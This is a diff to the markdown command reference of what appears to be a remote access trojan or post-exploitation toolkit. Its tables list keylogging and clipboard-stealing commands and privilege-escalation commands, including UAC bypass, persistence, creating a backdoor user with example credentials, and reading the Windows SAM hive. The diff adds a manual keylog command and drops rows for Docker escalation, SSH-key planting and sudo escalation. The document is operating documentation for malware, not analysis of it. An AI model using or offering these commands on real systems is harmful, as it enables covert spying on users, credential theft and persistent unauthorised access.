@@ -379,6 +379,7 @@ Release: 5.15.0
 | `keylog_dump` | Download keylog file (auto-saved as keylog_dump_TIMESTAMP.txt) | `keylog_dump` |
 | `keylog_status` | Check keylogger status | `keylog_status` |
 | `keylog_clear` | Clear keylog file | `keylog_clear` |
+| `keylog_manual <text>` | Manually log text (fallback mode) | `keylog_manual test input` |
 
 **Clipboard Stealer:**
 | Command | Description | Example |
@@ -404,11 +405,8 @@ Release: 5.15.0
 | `priv_weak_perms` | Find exploitable file permissions | `priv_weak_perms` |
 | `priv_uac_bypass` | Attempt UAC bypass (Windows) | `priv_uac_bypass` |
 | `priv_dll_hijack` | Find DLL hijacking opportunities | `priv_dll_hijack` |
-| `priv_docker` | Docker-based escalation | `priv_docker` |
 | `priv_persist [path]` | Create persistence mechanism | `priv_persist` |
 | `priv_user [user] [pass]` | Create backdoor user | `priv_user admin Pass123` |
-| `priv_ssh_key [key]` | Plant SSH key | `priv_ssh_key "ssh-rsa AAA..."` |
-| `priv_sudo [pass]` | Sudo escalation with password | `priv_sudo MyPass123` |
 | `priv_read_file <path>` | Read admin-protected text file | `priv_read_file C:\Windows\System32\config\SAM` |
 | `priv_read_binary <path>` | Read admin-protected binary file (base64) | `priv_read_binary C:\Windows\System32\cmd.exe` |
 | `priv_list_dir <path>` | List admin-protected directory | `priv_list_dir C:\Windows\System32\config` |
